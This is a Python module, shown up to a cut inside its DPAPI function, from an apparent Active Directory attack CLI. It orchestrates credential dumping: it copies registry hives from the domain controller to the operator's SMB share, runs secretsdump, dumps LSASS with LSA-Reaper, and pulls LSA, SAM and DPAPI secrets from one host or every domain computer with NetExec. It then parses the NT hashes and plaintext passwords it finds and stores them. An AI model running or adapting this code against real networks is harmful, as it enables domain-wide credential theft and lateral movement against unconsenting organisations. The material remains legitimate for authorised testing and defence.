"""Credential dump helpers for the CLI.

This module contains all credential and data extraction operations (dumps),
regardless of the protocol used (SMB, WinRM, Impacket, etc.).

Scope:
- Registry dumps (SAM/SECURITY/SYSTEM hives)
- LSA secrets extraction
- SAM database dumps
- DPAPI credential extraction
- LSASS memory dumps
- Hash extraction from dumped data

Module structure:
- `run_dump_*` functions: Build commands and orchestrate dump operations
- `execute_dump_*` functions: Execute commands and process output to extract credentials

All dump-related logic (command construction, execution, and output processing)
is centralized in this module for consistency and maintainability.
"""

from __future__ import annotations

from typing import Any
import os
import re

from rich.prompt import Confirm

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_table,
    print_info_debug,
    print_instruction,
    print_success,
    print_warning,
    print_operation_header,
    telemetry,
)
from adscan_internal.rich_output import (
    ScanProgressTracker,
    confirm_operation,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.workspaces.subpaths import domain_relpath

_NXC_SMB_LINE_RE = re.compile(r"^\s*SMB\s+\S+\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+")
_NXC_DUMPED_CREDENTIAL_TOKEN_RE = re.compile(r"(?P<token>[^\s\\]+\\[^\s:]+:[^\s]+)")
_NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:@\\]+@[^\s:@\\]+:[^\s]+)"
)
_NXC_DUMPED_SAM_TOKEN_RE = re.compile(
    r"(?P<token>[^\s:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:[^\s]*)"
)
_NXC_STATUS_TOKEN_RE = re.compile(r"\s\[(?:\+|-)\]\s")
_DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS = 300
_BULK_DUMP_COMMAND_TIMEOUT_SECONDS = 7200


def _ensure_pro_for_all_hosts_dump(shell: Any, *, dump_label: str) -> bool:
    """Validate policy for dump operations targeting all hosts."""
    _ = shell
    _ = dump_label
    return True


def _extract_dumped_credentials_with_hosts(
    output: str,
    *,
    excluded_substrings: set[str] | None = None,
) -> list[tuple[str, str | None]]:
    """Extract dumped credential tokens and best-effort source host from NetExec output."""
    if not output:
        return []

    excluded_lower = {value.lower() for value in (excluded_substrings or set())}
    current_host: str | None = None
    seen: set[str] = set()
    results: list[tuple[str, str | None]] = []

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line)
        if "(pwn3d!)" in line.lower() or _NXC_STATUS_TOKEN_RE.search(line):
            # Authentication success lines are not dumped credentials.
            continue
        host_match = _NXC_SMB_LINE_RE.match(line)
        if host_match:
            host_candidate = str(host_match.group("host") or "").strip()
            if host_candidate:
                current_host = host_candidate

        for pattern in (
            _NXC_DUMPED_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_UPN_CREDENTIAL_TOKEN_RE,
            _NXC_DUMPED_SAM_TOKEN_RE,
        ):
            for match in pattern.finditer(line):
                token = match.group("token").strip().strip(",;\"'")
                if not token:
                    continue
                token_lower = token.lower()
                if excluded_lower and any(
                    excl in token_lower for excl in excluded_lower
                ):
                    continue
                dedupe_key = f"{token_lower}|{str(current_host or '').lower()}"
                if dedupe_key in seen:
                    continue
                seen.add(dedupe_key)
                results.append((token, current_host))

    return results


def _resolve_step_host(
    *,
    parsed_host: str | None,
    requested_host: str,
) -> str | None:
    """Resolve host to use for credential source step creation."""
    if parsed_host:
        return parsed_host
    requested_clean = str(requested_host or "").strip()
    if requested_clean and requested_clean.lower() != "all":
        return requested_clean
    return None


def _extract_username_from_lsa_identity(identity: str) -> str:
    """Return normalized username from LSA identity (DOMAIN\\user or user@domain)."""
    identity_clean = str(identity or "").strip()
    if "\\" in identity_clean:
        return identity_clean.split("\\")[-1].strip()
    if "@" in identity_clean:
        return identity_clean.split("@", 1)[0].strip()
    return identity_clean


def _is_bulk_dump_target(requested_host: str) -> bool:
    """Return True when dump target represents all hosts."""
    return str(requested_host or "").strip().lower() == "all"


def _resolve_dump_command_timeout(requested_host: str) -> int:
    """Return command timeout based on dump scope."""
    if _is_bulk_dump_target(requested_host):
        return _BULK_DUMP_COMMAND_TIMEOUT_SECONDS
    return _DEFAULT_DUMP_COMMAND_TIMEOUT_SECONDS


def _record_bulk_finding(
    summary: dict[str, dict[str, Any]],
    *,
    host: str | None,
    username: str,
    is_hash: bool,
) -> None:
    """Aggregate credential findings per host for compact UX on bulk dumps."""
    host_key = str(host or "unknown host").strip() or "unknown host"
    bucket = summary.setdefault(
        host_key,
        {
            "hashes": 0,
            "passwords": 0,
            "users": set(),
        },
    )
    if is_hash:
        bucket["hashes"] += 1
    else:
        bucket["passwords"] += 1
    users = bucket.get("users")
    if isinstance(users, set):
        users.add(str(username or "").strip())


def _print_bulk_summary(*, dump_kind: str, summary: dict[str, dict[str, Any]]) -> None:
    """Render aggregated credential findings for bulk dump operations."""
    if not summary:
        return

    rows: list[dict[str, Any]] = []
    for host_name in sorted(summary.keys()):
        bucket = summary.get(host_name, {})
        users = bucket.get("users")
        users_count = len(users) if isinstance(users, set) else 0
        credentials_list: list[str] = []
        if isinstance(users, set):
            credentials_list = sorted(
                mark_sensitive(str(user), "user") for user in users if str(user).strip()
            )
        credentials_display = ", ".join(credentials_list) if credentials_list else "-"
        rows.append(
            {
                "Host": mark_sensitive(host_name, "hostname"),
                "Users": users_count,
                "Hashes": int(bucket.get("hashes", 0)),
                "Passwords": int(bucket.get("passwords", 0)),
                "Credentials": credentials_display,
            }
        )

    title = f"{dump_kind} Credential Summary by Host"
    print_info_table(
        rows, ["Host", "Users", "Hashes", "Passwords", "Credentials"], title=title
    )


def _record_bulk_credential(
    bucket: dict[tuple[str, str, bool], dict[str, Any]],
    *,
    username: str,
    credential: str,
    is_hash: bool,
    host: str | None,
) -> None:
    """Aggregate credentials for bulk dumps to avoid duplicate verification calls."""
    key = (str(username or "").strip().lower(), str(credential or "").strip(), is_hash)
    entry = bucket.setdefault(
        key,
        {
            "username": str(username or "").strip(),
            "credential": str(credential or "").strip(),
            "is_hash": is_hash,
            "hosts": set(),
        },
    )
    hosts = entry.get("hosts")
    if isinstance(hosts, set):
        hosts.add(str(host).strip() if host else "")


def _persist_bulk_credentials(
    shell: Any,
    *,
    domain: str,
    dump_kind: str,
    auth_username: str | None,
    credentials: dict[tuple[str, str, bool], dict[str, Any]],
) -> None:
    """Persist aggregated bulk credentials using one add_credential call per credential."""
    for entry in credentials.values():
        username = str(entry.get("username") or "").strip()
        credential = str(entry.get("credential") or "").strip()
        if not username or not credential:
            continue
        hosts = entry.get("hosts")
        host_values = (
            sorted(str(host).strip() for host in hosts if str(host).strip())
            if isinstance(hosts, set)
            else []
        )
        if host_values:
            source_steps: list[object] = []
            for host_value in host_values:
                source_steps.extend(
                    _build_dump_source_steps(
                        domain=domain,
                        dump_kind=dump_kind,
                        host=host_value,
                        auth_username=auth_username,
                    )
                )
        else:
            source_steps = _build_dump_source_steps(
                domain=domain,
                dump_kind=dump_kind,
                host=None,
                auth_username=auth_username,
            )
        shell.add_credential(
            domain,
            username,
            credential,
            source_steps=source_steps,
            prompt_for_user_privs_after=False,
            ui_silent=True,
            ensure_fresh_kerberos_ticket=False,
        )


def _build_dump_source_steps(
    *,
    domain: str,
    dump_kind: str,
    host: str | None,
    auth_username: str | None = None,
) -> list[object]:
    """Build credential provenance steps for dump-derived credentials."""
    from adscan_internal.principal_utils import normalize_machine_account
    from adscan_internal.services.attack_graph_service import (
        CredentialSourceStep,
        resolve_entry_label_for_auth,
    )

    dump_key = str(dump_kind or "").strip().upper()
    relation = f"Dump{dump_key}"
    edge_type = f"dump_{dump_key.lower()}"

    notes = {
        "source": "credential_dump",
        "dump_type": dump_key,
    }
    entry_label: str
    host_clean = str(host or "").strip()
    if host_clean and host_clean.lower() != "all":
        machine_sam = normalize_machine_account(host_clean)
        if machine_sam:
            entry_label = machine_sam.upper()
            notes["entry_kind"] = "computer"
        else:
            entry_label = resolve_entry_label_for_auth(auth_username)
    else:
        entry_label = resolve_entry_label_for_auth(auth_username)
    if host_clean:
        notes["target_host"] = host_clean
    if auth_username:
        notes["auth_username"] = str(auth_username).strip()

    return [
        CredentialSourceStep(
            relation=relation,
            edge_type=edge_type,
            entry_label=entry_label,
            notes=notes,
        )
    ]


def _build_delegate_suffix(shell: Any, domain: str, username: str) -> str:
    """Return NetExec delegation args when using a machine account for SMB."""
    from adscan_internal.principal_utils import is_machine_account

    if not is_machine_account(username):
        return ""
    try:
        admins = shell.get_domain_admins(domain)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        admins = []
    if not admins:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"Domain Admins list unavailable for {marked_domain}; "
            "skipping SMB delegation flags."
        )
        return ""
    delegate_user = str(admins[0]).strip()
    if not delegate_user:
        return ""
    marked_delegate = mark_sensitive(delegate_user, "user")
    print_info_debug(
        f"[dump] Using SMB delegation for machine account via {marked_delegate}."
    )
    return f" --delegate {delegate_user} --self"


def run_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Dump SAM/SECURITY/SYSTEM registry hives from the PDC using Impacket reg.py."""
    from adscan_internal import print_operation_header

    print_operation_header(
        "Registry Dump",
        details={
            "Domain": domain,
            "Target": "PDC Registry Hives",
            "Username": username,
            "Output": f"\\\\{shell.myip}\\smbFolder",
        },
        icon="📋",
    )

    shell.do_open_smb(domain)
    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    reg_path = os.path.join(shell.impacket_scripts_dir, "reg.py")
    auth = shell.build_auth_impacket(username, password, domain)
    command = f"{reg_path} {auth} backup -o '\\\\{shell.myip}\\smbFolder'"
    print_info_debug(f"Command: {command}")
    execute_dump_registries(shell, command, domain)


def run_secretsdump_registries(
    shell: Any,
    *,
    domain: str,
    sam_path: str | None = None,
    system_path: str | None = None,
) -> None:
    """Run secretsdump.py against locally saved SAM/SYSTEM hives for a domain."""
    from adscan_internal import print_operation_header

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    secretsdump_path = os.path.join(shell.impacket_scripts_dir, "secretsdump.py")
    if not os.path.isfile(secretsdump_path) or not os.access(secretsdump_path, os.X_OK):
        print_error(
            f"secretsdump.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    print_operation_header(
        "NTLM Hash Extraction",
        details={
            "Domain": domain,
            "Source": "Registry Hives (SAM + SYSTEM)",
            "Method": "secretsdump.py",
            "Target": "LOCAL",
        },
        icon="🔑",
    )

    sam_arg = sam_path or "SAM.save"
    system_arg = system_path or "SYSTEM.save"
    command = f"{secretsdump_path} -sam {sam_arg} -system {system_arg} LOCAL"
    print_info_debug(f"Command: {command}")
    from adscan_internal.cli.secretsdump import execute_secretsdump

    execute_secretsdump(shell, command, domain)


def run_dump_lsass(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str | None = None,  # kept for future extensions
) -> None:
    """Dump LSASS using LSA-Reaper (hash or password auth)."""
    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR

    lsa_reaper_python = shell.lsa_reaper_python or "python"
    if shell.is_hash(password):
        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        marked_host = mark_sensitive(host, "hostname")
        marked_password = mark_sensitive(password, "password")
        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
        command = (
            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}'@{marked_host} "
            f"-hashes :{marked_password} -ap -av -l domains/{marked_domain}"
        )
    else:
        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        marked_password = mark_sensitive(password, "password")
        marked_host = mark_sensitive(host, "hostname")
        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
        command = (
            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}':'{marked_password}'@{marked_host} "
            f"-ap -av -l domains/{marked_domain}"
        )

    marked_host = mark_sensitive(host, "hostname")
    print_info(f"Dumping LSASS from host {marked_host}")
    execute_dump_lsass(shell, command, domain, host)


def run_dump_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump LSA secrets over SMB using NetExec."""
    if str(host or "").strip().lower() == "all" and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="LSA"
    ):
        return

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if host == "All" else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
    }
    if host == "All":
        operation_details["Output"] = f"domains/{domain}/smb/dump_all_lsa.txt"
    else:
        operation_details["Output"] = f"domains/{domain}/smb/dump_{host}_lsa.txt"

    print_operation_header("LSA Secrets Dump", details=operation_details, icon="🔓")

    command: str | None = None

    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if host == "All":
            hosts_file = domain_relpath(
                shell.domains_dir, domain, "enabled_computers_ips.txt"
            )
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", "dump_all_lsa.txt"
            )
            command = (
                f"{shell.netexec_path} smb {hosts_file} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
                f"--log {log_file} --lsa{delegate_suffix}"
            )
        elif host != "All":
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", f"dump_{host}_lsa.txt"
            )
            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa{delegate_suffix}"
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", f"dump_{host}_lsa.txt"
            )
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa"
            )

    if not command:
        return

    print_info_debug(f"Command: {command}")
    execute_dump_lsa(shell, command, domain, host, auth_username=username)


def run_dump_sam(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump SAM database over SMB using NetExec."""
    if str(host or "").strip().lower() == "all" and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="SAM"
    ):
        return

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if host == "All" else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
    }
    if host == "All":
        operation_details["Output"] = f"domains/{domain}/smb/dump_all_sam.txt"
    else:
        operation_details["Output"] = f"domains/{domain}/smb/dump_{host}_sam.txt"

    print_operation_header("SAM Database Dump", details=operation_details, icon="💾")

    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if host == "All":
            hosts_file = domain_relpath(
                shell.domains_dir, domain, "enabled_computers_ips.txt"
            )
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", "dump_all_sam.txt"
            )
            command = (
                f"{shell.netexec_path} smb {hosts_file} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
                f"--log {log_file} --sam{delegate_suffix}"
            )
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, "All", auth_username=username)
        elif host != "All":
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", f"dump_{host}_sam.txt"
            )
            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam{delegate_suffix}"
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, host, auth_username=username)
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            log_file = domain_relpath(
                shell.domains_dir, domain, "smb", f"dump_{host}_sam.txt"
            )
            command = (
                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam"
            )
            print_info_debug(f"Command: {command}")
            execute_dump_sam(shell, command, domain, host, auth_username=username)


def run_dump_sam_winrm(
    shell: Any, *, domain: str, username: str, password: str, host: str
) -> None:
    """Dump SAM credentials over WinRM using NetExec."""
    auth_str = shell.build_auth_nxc(username, password, domain)
    if host == "All":
        marked_domain = mark_sensitive(domain, "domain")
        hosts_file = domain_relpath(
            shell.domains_dir, domain, "enabled_computers_ips.txt"
        )
        log_file = domain_relpath(
            shell.domains_dir, domain, "winrm", "dump_all_sam.txt"
        )
        command = (
            f"{shell.netexec_path} winrm {hosts_file} "
            f"{auth_str} -t 16 --log {log_file} "
            "--sam --dump-method powershell | awk '{print $5}' | "
            "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
        )
        print_info(f"Dumping SAM credentials from all hosts in domain {marked_domain}")
        print_info_debug(f"Command: {command}")
        execute_dump_sam(shell, command, domain, "All", auth_username=username)
        return

    marked_host = mark_sensitive(host, "hostname")
    marked_domain = mark_sensitive(domain, "domain")
    log_file = domain_relpath(
        shell.domains_dir, domain, "winrm", f"dump_{host}_sam.txt"
    )
    command = (
        f"{shell.netexec_path} winrm {marked_host} {auth_str} "
        f"--log {log_file} "
        "--sam --dump-method powershell | awk '{print $5}' | "
        "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
    )
    print_info(
        f"Dumping SAM credentials from host {marked_host} in domain {marked_domain}"
    )
    print_info_debug(f"Command: {command}")
    execute_dump_sam(shell, command, domain, host, auth_username=username)


def run_dump_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Dump DPAPI credentials over SMB using NetExec."""
    if str(host or "").strip().lower() == "all" and not _ensure_pro_for_all_hosts_dump(
        shell, dump_label="DPAPI"
    ):
        return

    operation_details = {
        "Domain": domain,
        "Target": "All Hosts" if host == "All" else host,
        "Username": username,
        "Auth Type": "Domain" if islocal == "false" else "Local",
    }
    if host == "All":
        operation_details["Output"] = f"domains/{domain}/smb/dump_all_dpapi.txt"
    else:
        operation_details["Output"] = f"domains/{domain}/smb/dump_{host}_dpapi.txt"

    print_operation_header(
        "DPAPI Credentials Dump", details=operation_details, icon="🔐"
    )

    command: str | None = None
    if islocal == "false":
        auth_str = shell.build_auth_nxc(username, password, domain)
        delegate_suffix = _build_delegate_suffix(shell, domain, username)
        if host == "All":
            marked_domain = mark_sensitive(domain, "domain")
            command = (
                f"{shell.netexec_path} smb 'domains'/{marked_domain}/enabled_computers_ips.txt "
                f"{auth_str} -t 1 --timeout 60 --smb-timeout 30 --log "
                f"domains/{marked_domain}/smb/dump_all_dpapi.txt --dpapi{delegate_suffix} "
            )
        elif host != "All":
            marked_host = mark_sensitive(host, "hostname")
            marked_domain = mark_sensitive(domain, "domain")
            command = (
                f"{shell.netexec_path} smb {marked_host} {auth_str} --log "
                f"domains/{marked_domain}/smb/dump_{marked_host}_dpapi.txt --dpapi{delegate_suffix} "
            )
    else:
        auth_str = shell.build_auth_nxc(username, password)
        if host != "All":
            marked_host = mark_sensitive(host, "hostname")
            marked_domain = mark_sensitive(domain, "domain")
            command = (
                f"{shell.netexec_path} smb {marked_host} {auth_str} --log "
                f"domains/{marked_domain}/smb/dump_{marked_host}_dpapi.txt --dpapi "
            )

    if not command:
        print_warning(
            "No valid command could be built for dump_dpapi with the provided parameters."
        )
        return

    print_info_debug(f"Command: {command}")
    execute_dump_dpapi(shell, command, domain, host, auth_username=username)


def execute_dump_registries(shell: Any, command: str, domain: str) -> None:
    """Execute registry dump command and trigger secretsdump on success."""
    try:
        completed_process = shell.run_command(command, timeout=300)

        if completed_process.returncode == 0:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Registries from the PDC of domain {marked_domain} dumped successfully"
            )
            shell.do_secretsdump_registries(domain)
        else:
            error_message = (
                completed_process.stderr.strip()
                if completed_process.stderr
                else completed_process.stdout.strip()
            )
            marked_domain = mark_sensitive(domain, "domain")
            print_error(
                f"Error dumping registries from the PDC of domain {marked_domain}: {error_message if error_message else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Error dumping registries from the PDC of domain {marked_domain}: {e}"
        )


def execute_dump_lsa(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute LSA dump command and process credentials from output."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        if completed_process is None:
            print_error("Error executing LSA dump: command failed to return output.")
            return
        output = completed_process.stdout
        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            excluded = {
                "]",
                "guest",
                "invitado",
                "defaultaccount",
                "wdagutilityaccount",
                "dpapi_machinekey",
                "plain_password_hex",
                "des-cbc-md5",
                "aes256-cts-hmac-sha1-96",
                "nl$km",
                "aes128-cts-hmac-sha1-96",
                "dcc2",
            }
            credential_entries = _extract_dumped_credentials_with_hosts(
                output, excluded_substrings=excluded
            )
            # Process each line of output
            candidate_entries = credential_entries or [
                (line, None) for line in output.splitlines()
            ]
            for line, parsed_host in candidate_entries:
                if not line.strip():  # Skip empty lines
                    continue
                if _NXC_STATUS_TOKEN_RE.search(line):
                    continue

                # Pattern to detect NTLM hashes (32 hexadecimal characters)
                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

                # Case 1: Line contains an NTLM hash
                if re.search(hash_pattern, line):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        user_domain = parts[0]
                        nt_hash = parts[3]  # NT hash is always the fourth field
                        # Extract only the username without the domain
                        username = user_domain.split("\\")[-1]
                        # Do not save computer accounts (ending with $)
                        if (
                            not username.endswith("$")
                            and nt_hash.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0"
                        ):
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=True,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=nt_hash,
                                    is_hash=True,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_nt_hash = mark_sensitive(nt_hash, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Hash found from LSA dump on {marked_host} - User: {marked_username}, NT Hash: {marked_nt_hash}"
                                )
                            if not bulk_mode:
                                shell.add_credential(
                                    domain,
                                    username,
                                    nt_hash,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="LSA",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )

                # Case 2: Plaintext password
                elif (
                    ":" in line
                    and not re.search(hash_pattern, line)
                    and ("\\" in line or "@" in line)
                ):
                    try:
                        user_part, password = line.rsplit(":", 1)
                        # Extract only the username without domain/realm.
                        username = _extract_username_from_lsa_identity(user_part)
                        if password and not username.endswith("$"):
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_password = mark_sensitive(password, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
                                )
                            if not bulk_mode:
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="LSA",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )
                    except ValueError as e:
                        telemetry.capture_exception(e)
                        print_warning(f"Could not process the line: {line.strip()}")

            if bulk_mode:
                _persist_bulk_credentials(
                    shell,
                    domain=domain,
                    dump_kind="LSA",
                    auth_username=auth_username,
                    credentials=bulk_credentials,
                )
                _print_bulk_summary(dump_kind="LSA", summary=bulk_summary)
            print_info("LSA dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing LSA dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during LSA dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_sam(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute SAM dump command and process credentials from output."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        if completed_process is None:
            print_error("Error executing SAM dump: command failed to return output.")
            return
        output = completed_process.stdout
        errors_output = completed_process.stderr

        if completed_process.returncode == 0:
            bulk_mode = _is_bulk_dump_target(host)
            bulk_summary: dict[str, dict[str, Any]] = {}
            bulk_credentials: dict[tuple[str, str, bool], dict[str, Any]] = {}
            excluded = {
                "]",
                "guest",
                "invitado",
                "defaultaccount",
                "wdagutilityaccount",
            }
            credential_entries = _extract_dumped_credentials_with_hosts(
                output, excluded_substrings=excluded
            )
            # Process each line of output
            candidate_entries = credential_entries or [
                (line, None) for line in output.splitlines()
            ]
            for line, parsed_host in candidate_entries:
                if not line.strip():  # Skip empty lines
                    continue
                if _NXC_STATUS_TOKEN_RE.search(line):
                    continue

                # Pattern to detect NTLM hashes (32 hexadecimal characters)
                hash_pattern = r"[a-fA-F0-9]{32}:[a-fA-F0-9]{32}"

                # Case 1: Line contains an NTLM hash
                if re.search(hash_pattern, line):
                    parts = line.split(":")
                    if len(parts) >= 4:
                        user_domain = parts[0]
                        nt_hash = parts[3]  # NT hash is always the fourth field
                        # Extract only the username without the domain
                        username = user_domain.split("\\")[-1]
                        # Do not save computer accounts (ending with $)
                        if (
                            not username.endswith("$")
                            and nt_hash.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0"
                        ):
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=True,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=nt_hash,
                                    is_hash=True,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_nt_hash = mark_sensitive(nt_hash, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_warning(
                                    f"Hash found from SAM dump on {marked_host} - Local User: {marked_username}, NT Hash: {marked_nt_hash}"
                                )
                            if not bulk_mode:
                                shell.add_credential(
                                    domain,
                                    username,
                                    nt_hash,
                                    host,
                                    "smb",
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="SAM",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )

                # Case 2: Plaintext password
                elif "\\" in line and ":" in line and not re.search(hash_pattern, line):
                    try:
                        user_part, password = line.rsplit(":", 1)
                        # Extract only the username without the domain
                        username = user_part.split("\\")[-1]
                        if password and not username.endswith("$"):
                            step_host = _resolve_step_host(
                                parsed_host=parsed_host, requested_host=host
                            )
                            if bulk_mode:
                                _record_bulk_finding(
                                    bulk_summary,
                                    host=step_host,
                                    username=username,
                                    is_hash=False,
                                )
                                _record_bulk_credential(
                                    bulk_credentials,
                                    username=username,
                                    credential=password,
                                    is_hash=False,
                                    host=step_host,
                                )
                            else:
                                marked_username = mark_sensitive(username, "user")
                                marked_password = mark_sensitive(password, "password")
                                marked_host = mark_sensitive(
                                    step_host or "unknown host", "hostname"
                                )
                                print_success(
                                    f"Credential found on {marked_host} - User: {marked_username}, Password: {marked_password}"
                                )
                            if not bulk_mode:
                                shell.add_credential(
                                    domain,
                                    username,
                                    password,
                                    host,
                                    "smb",
                                    source_steps=_build_dump_source_steps(
                                        domain=domain,
                                        dump_kind="SAM",
                                        host=step_host,
                                        auth_username=auth_username,
                                    ),
                                )
                    except ValueError as e:
                        telemetry.capture_exception(e)
                        print_warning(f"Could not process the line: {line.strip()}")

            if bulk_mode:
                _persist_bulk_credentials(
                    shell,
                    domain=domain,
                    dump_kind="SAM",
                    auth_username=auth_username,
                    credentials=bulk_credentials,
                )
                _print_bulk_summary(dump_kind="SAM", summary=bulk_summary)
            print_success("SAM dump processing completed")
        else:
            error_message = errors_output.strip() if errors_output else output.strip()
            print_error(
                f"Error executing SAM dump: {error_message if error_message else 'Details not available'}"
            )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during SAM dump.")
        print_exception(show_locals=False, exception=e)


def execute_dump_dpapi(
    shell: Any,
    command: str,
    domain: str,
    host: str,
    auth_username: str | None = None,
) -> None:
    """Execute DPAPI dump command, display output, and process credentials."""
    try:
        timeout_seconds = _resolve_dump_command_timeout(host)
        print_info_debug(
            f"Using dump command timeout={timeout_seconds}s for host target '{host}'."
        )
        completed_process = shell.run_command(command, timeout=timeout_seconds)
        output = completed_process.stdout
